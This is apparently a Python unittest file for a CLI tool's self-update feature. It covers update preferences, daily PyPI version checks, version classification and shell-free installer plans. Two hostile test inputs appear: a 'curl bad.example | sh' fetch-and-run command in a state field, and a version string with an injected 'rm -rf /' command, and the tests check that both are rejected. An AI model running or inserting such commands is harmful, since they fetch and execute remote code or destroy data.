from __future__ import annotations

import argparse
from contextlib import contextmanager
from contextlib import redirect_stdout
from datetime import date
from io import BytesIO, StringIO
import json
import os
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest.mock import Mock, patch

from dyro import __version__
from dyro.errors import DyroError, ValidationError
from dyro.updates import (
    PYPI_JSON_URL,
    UpdateKind,
    UpdatePlan,
    UpdateResult,
    UpdateState,
    build_update_plan,
    check_for_update,
    classify_update,
    fetch_latest_version,
    load_update_state,
    perform_update,
    set_auto_patch,
    set_update_enabled,
)


class _Response:
    def __init__(self, payload: bytes) -> None:
        self.payload = payload

    def __enter__(self) -> _Response:
        return self

    def __exit__(self, *_: object) -> None:
        return None

    def read(self, size: int = -1) -> bytes:
        return BytesIO(self.payload).read(size)


class UpdateStateTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory(prefix="dyro-updates-")
        self.environment = patch.dict(os.environ, {"DYRO_HOME": self.tmp.name})
        self.environment.start()

    def tearDown(self) -> None:
        self.environment.stop()
        self.tmp.cleanup()

    def test_preferences_round_trip_in_user_state(self) -> None:
        self.assertEqual(load_update_state(), UpdateState())

        enabled = set_auto_patch(True)
        self.assertTrue(enabled.check_enabled)
        self.assertTrue(enabled.auto_patch)
        self.assertFalse(Path(self.tmp.name, "workspaces.json").exists())

        disabled = set_update_enabled(False)
        self.assertFalse(disabled.check_enabled)
        self.assertFalse(disabled.auto_patch)
        self.assertEqual(load_update_state(), disabled)

    def test_state_rejects_unknown_fields(self) -> None:
        Path(self.tmp.name, "updates.json").write_text(
            json.dumps(
                {
                    "schema_version": 1,
                    "check_enabled": True,
                    "auto_patch": False,
                    "last_checked_on": "",
                    "latest_version": "",
                    "command": "curl bad.example | sh",
                }
            ),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "未知字段"):
            load_update_state()

    def test_daily_check_uses_network_only_once_per_local_date(self) -> None:
        calls: list[str] = []

        def fetch(current_version: str) -> str:
            calls.append(current_version)
            return "0.5.6"

        first = check_for_update(
            "0.5.5", today=date(2026, 8, 4), fetch=fetch
        )
        second = check_for_update(
            "0.5.5", today=date(2026, 8, 4), fetch=fetch
        )

        self.assertTrue(first.checked)
        self.assertEqual(first.kind, UpdateKind.PATCH)
        self.assertFalse(second.checked)
        self.assertEqual(second.latest_version, "0.5.6")
        self.assertEqual(calls, ["0.5.5"])

    def test_failed_daily_check_is_silent_and_not_retried_that_day(self) -> None:
        calls = 0

        def fetch(_: str) -> str:
            nonlocal calls
            calls += 1
            raise DyroError("offline")

        first = check_for_update(
            "0.5.5", today=date(2026, 8, 4), fetch=fetch
        )
        second = check_for_update(
            "0.5.5", today=date(2026, 8, 4), fetch=fetch
        )

        self.assertEqual(first.error, "offline")
        self.assertFalse(second.checked)
        self.assertEqual(calls, 1)

    def test_daily_check_releases_state_lock_before_network_access(self) -> None:
        lock_depth = 0
        observed_timeouts: list[float] = []

        @contextmanager
        def tracked_lock(_: Path, *, timeout_seconds: float):
            nonlocal lock_depth
            observed_timeouts.append(timeout_seconds)
            lock_depth += 1
            try:
                yield
            finally:
                lock_depth -= 1

        def fetch(_: str) -> str:
            self.assertEqual(lock_depth, 0)
            return "0.5.6"

        with patch("dyro.updates.exclusive_lock", side_effect=tracked_lock):
            result = check_for_update(
                "0.5.5", today=date(2026, 8, 4), fetch=fetch
            )

        self.assertEqual(result.kind, UpdateKind.PATCH)
        self.assertEqual(observed_timeouts, [0.25, 0.25])

    def test_state_write_failure_is_reported_as_a_dyro_error(self) -> None:
        with (
            patch("dyro.updates.atomic_write_text", side_effect=OSError("read-only")),
            self.assertRaisesRegex(DyroError, "无法保存更新偏好"),
        ):
            set_auto_patch(True)

    def test_force_check_ignores_daily_cache_and_disabled_preference(self) -> None:
        set_update_enabled(False)
        result = check_for_update(
            "0.5.5",
            force=True,
            today=date(2026, 8, 4),
            fetch=lambda _: "0.5.6",
        )
        self.assertTrue(result.checked)
        self.assertEqual(result.kind, UpdateKind.PATCH)


class VersionCheckTests(unittest.TestCase):
    def test_classifies_stable_updates(self) -> None:
        self.assertEqual(classify_update("0.5.5", "0.5.5"), UpdateKind.NONE)
        self.assertEqual(classify_update("0.5.5", "0.5.6"), UpdateKind.PATCH)
        self.assertEqual(classify_update("0.5.5", "0.6.0"), UpdateKind.MINOR)
        self.assertEqual(classify_update("0.5.5", "1.0.0"), UpdateKind.MAJOR)
        self.assertEqual(classify_update("0.5.5", "0.4.9"), UpdateKind.NONE)

    def test_rejects_untrusted_version_shapes(self) -> None:
        for version in ("latest", "0.5", "0.5.6;rm -rf /", "0.5.6rc1"):
            with self.subTest(version=version), self.assertRaises(ValidationError):
                classify_update("0.5.5", version)

    def test_fetch_uses_only_fixed_pypi_endpoint_and_bounded_timeout(self) -> None:
        seen: dict[str, object] = {}

        def open_url(request: object, *, timeout: float) -> _Response:
            seen["url"] = request.full_url  # type: ignore[attr-defined]
            seen["headers"] = dict(request.header_items())  # type: ignore[attr-defined]
            seen["timeout"] = timeout
            return _Response(b'{"info":{"version":"0.5.6"}}')

        latest = fetch_latest_version(
            "0.5.5", open_url=open_url, timeout=0.25
        )

        self.assertEqual(latest, "0.5.6")
        self.assertEqual(seen["url"], PYPI_JSON_URL)
        self.assertEqual(seen["timeout"], 0.25)
        self.assertIn("dyro/0.5.5", seen["headers"]["User-agent"])

    def test_fetch_rejects_oversized_or_invalid_payloads(self) -> None:
        with self.assertRaisesRegex(DyroError, "响应过大"):
            fetch_latest_version(
                "0.5.5",
                open_url=lambda *_args, **_kwargs: _Response(b"x" * 300_000),
            )
        with self.assertRaisesRegex(DyroError, "响应无效"):
            fetch_latest_version(
                "0.5.5",
                open_url=lambda *_args, **_kwargs: _Response(b"{}"),
            )


class UpdateInstallerTests(unittest.TestCase):
    def test_builds_manager_specific_shell_free_plans(self) -> None:
        commands = {"uv": "/bin/uv", "pipx": "/bin/pipx"}

        def which(name: str) -> str | None:
            return commands.get(name)

        uv = build_update_plan(
            "0.5.6",
            prefix="/home/me/.local/share/uv/tools/dyro",
            executable="/tool/bin/python",
            which=which,
            editable=False,
        )
        pipx = build_update_plan(
            "0.5.6",
            prefix="/home/me/.local/pipx/venvs/dyro",
            executable="/tool/bin/python",
            which=which,
            editable=False,
        )
        pip = build_update_plan(
            "0.5.6",
            prefix="/home/me/venv",
            executable="/home/me/venv/bin/python",
            which=lambda _: None,
            editable=False,
            pip_available=True,
        )

        self.assertEqual(
            uv.argv,
            (
                "/bin/uv",
                "tool",
                "upgrade",
                "--default-index",
                "https://pypi.org/simple",
                "--no-config",
                "dyro==0.5.6",
            ),
        )
        self.assertEqual(
            pipx.argv,
            (
                "/bin/pipx",
                "upgrade",
                "--index-url",
                "https://pypi.org/simple",
                "dyro",
            ),
        )
        self.assertEqual(pipx.constraint, "dyro==0.5.6")
        self.assertEqual(
            pip.argv,
            (
                "/home/me/venv/bin/python",
                "-m",
                "pip",
                "--isolated",
                "install",
                "--upgrade",
                "--index-url",
                "https://pypi.org/simple",
                "dyro==0.5.6",
            ),
        )
        self.assertNotIn("sh", uv.argv)

    def test_refuses_to_replace_an_editable_source_checkout(self) -> None:
        with self.assertRaisesRegex(DyroError, "editable"):
            build_update_plan("0.5.6", editable=True)

    def test_preserves_user_site_scope_and_requires_original_manager(self) -> None:
        user = build_update_plan(
            "0.5.6",
            prefix="/usr/local",
            executable="/usr/local/bin/python3",
            which=lambda _: None,
            editable=False,
            user_install=True,
            pip_available=True,
        )
        self.assertIn("--user", user.argv)
        self.assertEqual(user.scope, "当前 Python 用户环境")

        with self.assertRaisesRegex(DyroError, "找不到 uv"):
            build_update_plan(
                "0.5.6",
                prefix="/home/me/.local/share/uv/tools/dyro",
                which=lambda _: None,
                editable=False,
            )

    def test_uses_uv_pip_for_a_virtualenv_without_pip(self) -> None:
        plan = build_update_plan(
            "0.5.6",
            prefix="/home/me/venv",
            base_prefix="/usr/local",
            executable="/home/me/venv/bin/python",
            which=lambda name: "/bin/uv" if name == "uv" else None,
            editable=False,
            pip_available=False,
        )
        self.assertEqual(plan.manager, "uv pip")
        self.assertEqual(
            plan.argv,
            (
                "/bin/uv",
                "pip",
                "install",
                "--python",
                "/home/me/venv/bin/python",
                "--upgrade",
                "--default-index",
                "https://pypi.org/simple",
                "--no-config",
                "dyro==0.5.6",
            ),
        )

        with self.assertRaisesRegex(DyroError, "没有 pip，也找不到可用的 uv"):
            build_update_plan(
                "0.5.6",
                prefix="/home/me/venv",
                base_prefix="/usr/local",
                executable="/home/me/venv/bin/python",
                which=lambda _: None,
                editable=False,
                pip_available=False,
            )
        with self.assertRaisesRegex(DyroError, "找不到 pipx"):
            build_update_plan(
                "0.5.6",
                prefix="/home/me/.local/pipx/venvs/dyro",
                which=lambda _: None,
                editable=False,
            )

    def test_perform_update_requires_confirmation_and_verifies_version(self) -> None:
        calls: list[tuple[str, ...]] = []

        def run(argv: tuple[str, ...], **_: object) -> subprocess.CompletedProcess[str]:
            calls.append(argv)
            return subprocess.CompletedProcess(argv, 0, "done")

        with patch("dyro.updates.build_update_plan") as build:
            build.return_value = UpdatePlan(
                "pip", ("python", "-m", "pip", "install"), "当前 Python 环境"
            )
            self.assertFalse(
                perform_update(
                    "0.5.6",
                    yes=False,
                    dry_run=False,
                    ask=lambda _: "n",
                    run=run,
                    installed_version=lambda: "0.5.5",
                )
            )
            self.assertEqual(calls, [])

            self.assertTrue(
                perform_update(
                    "0.5.6",
                    yes=True,
                    dry_run=False,
                    run=run,
                    installed_version=lambda: "0.5.6",
                )
            )
        self.assertEqual(calls, [("python", "-m", "pip", "install")])

    def test_perform_update_fails_closed_on_install_or_version_mismatch(self) -> None:
        def failed(argv: tuple[str, ...], **_: object) -> subprocess.CompletedProcess[str]:
            return subprocess.CompletedProcess(argv, 2, "bad")

        def succeeded(argv: tuple[str, ...], **_: object) -> subprocess.CompletedProcess[str]:
            return subprocess.CompletedProcess(argv, 0, "ok")

        def timed_out(argv: tuple[str, ...], **_: object) -> subprocess.CompletedProcess[str]:
            raise subprocess.TimeoutExpired(argv, 600)

        with patch("dyro.updates.build_update_plan") as build:
            build.return_value = UpdatePlan(
                "pip", ("python", "-m", "pip", "install"), "当前 Python 环境"
            )
            with self.assertRaisesRegex(DyroError, "更新失败"):
                perform_update(
                    "0.5.6", yes=True, dry_run=False, run=failed
                )
            with self.assertRaisesRegex(DyroError, "版本验证失败"):
                perform_update(
                    "0.5.6",
                    yes=True,
                    dry_run=False,
                    run=succeeded,
                    installed_version=lambda: "0.5.5",
                )
            with self.assertRaisesRegex(DyroError, "更新超时"):
                perform_update(
                    "0.5.6", yes=True, dry_run=False, run=timed_out
                )

    def test_pipx_exact_constraint_is_temporary_and_index_env_is_sanitized(self) -> None:
        observed: dict[str, object] = {}

        def run(
            argv: tuple[str, ...], **kwargs: object
        ) -> subprocess.CompletedProcess[str]:
            environment = kwargs["env"]
            constraint_path = Path(environment["PIP_CONSTRAINT"])  # type: ignore[index]
            observed["constraint"] = constraint_path.read_text(encoding="utf-8")
            observed["constraint_path"] = constraint_path
            observed["environment"] = environment
            return subprocess.CompletedProcess(argv, 0, "ok")

        plan = UpdatePlan(
            "pipx",
            ("pipx", "upgrade", "--index-url", "https://pypi.org/simple", "dyro"),
            "当前 pipx 隔离环境",
            constraint="dyro==0.5.6",
        )
        with (
            patch("dyro.updates.build_update_plan", return_value=plan),
            patch.dict(
                os.environ,
                {
                    "PIP_INDEX_URL": "https://mirror.invalid/simple",
                    "PIP_EXTRA_INDEX_URL": "https://extra.invalid/simple",
                },
            ),
        ):
            self.assertTrue(
                perform_update(
                    "0.5.6",
                    yes=True,
                    dry_run=False,
                    run=run,
                    installed_version=lambda: "0.5.6",
                )
            )

        environment = observed["environment"]
        self.assertNotIn("PIP_INDEX_URL", environment)
        self.assertNotIn("PIP_EXTRA_INDEX_URL", environment)
        self.assertEqual(observed["constraint"], "dyro==0.5.6\n")
        self.assertFalse(observed["constraint_path"].exists())


class DailyCliIntegrationTests(unittest.TestCase):
    def test_daily_notice_is_limited_to_interactive_home_surfaces(self) -> None:
        from dyro.cli import _should_run_daily_update

        self.assertTrue(
            _should_run_daily_update(
                argparse.Namespace(command=None, dry_run=False), interactive=True
            )
        )
        self.assertTrue(
            _should_run_daily_update(
                argparse.Namespace(command="home", dry_run=False), interactive=True
            )
        )
        self.assertFalse(
            _should_run_daily_update(
                argparse.Namespace(command="tool", dry_run=False), interactive=True
            )
        )
        self.assertFalse(
            _should_run_daily_update(
                argparse.Namespace(command=None, dry_run=True), interactive=True
            )
        )
        self.assertFalse(
            _should_run_daily_update(
                argparse.Namespace(command=None, dry_run=False), interactive=False
            )
        )

    def test_patch_auto_update_is_opt_in_and_minor_updates_only_notify(self) -> None:
        from dyro.cli import _maybe_run_daily_update

        patch_result = UpdateResult(
            checked=True,
            current_version="0.5.5",
            latest_version="0.5.6",
            kind=UpdateKind.PATCH,
        )
        minor_result = UpdateResult(
            checked=True,
            current_version="0.5.5",
            latest_version="0.6.0",
            kind=UpdateKind.MINOR,
        )
        output = StringIO()
        install = Mock(return_value=True)
        with (
            patch("dyro.cli.check_for_update", return_value=patch_result),
            patch(
                "dyro.cli.load_update_state",
                return_value=UpdateState(auto_patch=True),
            ),
            redirect_stdout(output),
        ):
            _maybe_run_daily_update(install=install)
        install.assert_called_once_with(
            "0.5.6", yes=True, dry_run=False
        )
        self.assertIn("自动更新完成", output.getvalue())

        output = StringIO()
        install.reset_mock()
        with (
            patch("dyro.cli.check_for_update", return_value=minor_result),
            patch(
                "dyro.cli.load_update_state",
                return_value=UpdateState(auto_patch=True),
            ),
            redirect_stdout(output),
        ):
            _maybe_run_daily_update(install=install)
        install.assert_not_called()
        self.assertIn("dyro update now", output.getvalue())

    def test_daily_check_failure_never_blocks_or_prints(self) -> None:
        from dyro.cli import _maybe_run_daily_update

        output = StringIO()
        with (
            patch(
                "dyro.cli.check_for_update",
                return_value=UpdateResult(
                    checked=True,
                    current_version="0.5.5",
                    error="offline",
                ),
            ),
            redirect_stdout(output),
        ):
            _maybe_run_daily_update()
        self.assertEqual(output.getvalue(), "")

    def test_daily_state_io_failure_never_blocks_or_prints(self) -> None:
        from dyro.cli import _maybe_run_daily_update

        output = StringIO()
        with (
            patch("dyro.cli.check_for_update", side_effect=OSError("read-only")),
            redirect_stdout(output),
        ):
            _maybe_run_daily_update()
        self.assertEqual(output.getvalue(), "")

    def test_environment_opt_out_accepts_only_truthy_values(self) -> None:
        from dyro.cli import _should_run_daily_update

        args = argparse.Namespace(command=None, dry_run=False)
        with patch.dict(os.environ, {"DYRO_NO_UPDATE_CHECK": "1"}):
            self.assertFalse(_should_run_daily_update(args, interactive=True))
        with patch.dict(os.environ, {"DYRO_NO_UPDATE_CHECK": "0"}):
            self.assertTrue(_should_run_daily_update(args, interactive=True))

    def test_update_commands_work_without_a_workspace(self) -> None:
        from dyro.cli import main

        with tempfile.TemporaryDirectory(prefix="dyro-update-cli-") as tmp:
            result = UpdateResult(
                checked=True,
                current_version="0.5.5",
                latest_version="0.5.6",
                kind=UpdateKind.PATCH,
            )
            output = StringIO()
            with (
                patch.dict(os.environ, {"DYRO_HOME": tmp}),
                patch("dyro.cli.check_for_update", return_value=result),
                patch("dyro.cli.perform_update", return_value=False) as install,
                redirect_stdout(output),
            ):
                main(["update", "auto", "on"])
                self.assertTrue(load_update_state().auto_patch)
                main(["--dry-run", "update", "now"])
                main(["update", "disable"])
                self.assertFalse(load_update_state().check_enabled)
            install.assert_called_once_with(
                "0.5.6", yes=False, dry_run=True
            )
            self.assertIn("发现 Dyro 0.5.6", output.getvalue())

    def test_explicit_check_uses_a_longer_network_timeout(self) -> None:
        from dyro.cli import _explicit_update_check

        def check(
            current: str, *, force: bool, persist: bool, fetch: object
        ) -> str:
            self.assertTrue(force)
            self.assertTrue(persist)
            return fetch(current)  # type: ignore[operator]

        with (
            patch("dyro.cli.check_for_update", side_effect=check),
            patch("dyro.cli.fetch_latest_version", return_value="0.5.5") as fetch,
        ):
            self.assertEqual(_explicit_update_check(), "0.5.5")
        fetch.assert_called_once_with(__version__, timeout=5.0)

    def test_update_now_dry_run_does_not_create_user_state(self) -> None:
        from dyro.cli import main

        major, minor, patch_version = (int(part) for part in __version__.split("."))
        latest_version = f"{major}.{minor}.{patch_version + 1}"
        with tempfile.TemporaryDirectory(prefix="dyro-update-dry-run-") as tmp:
            with (
                patch.dict(os.environ, {"DYRO_HOME": tmp}),
                patch(
                    "dyro.cli.fetch_latest_version", return_value=latest_version
                ),
                patch("dyro.cli.perform_update", return_value=False) as install,
            ):
                main(["--dry-run", "update", "now"])
            self.assertEqual(list(Path(tmp).iterdir()), [])
            install.assert_called_once_with(
                latest_version, yes=False, dry_run=True
            )


if __name__ == "__main__":
    unittest.main()
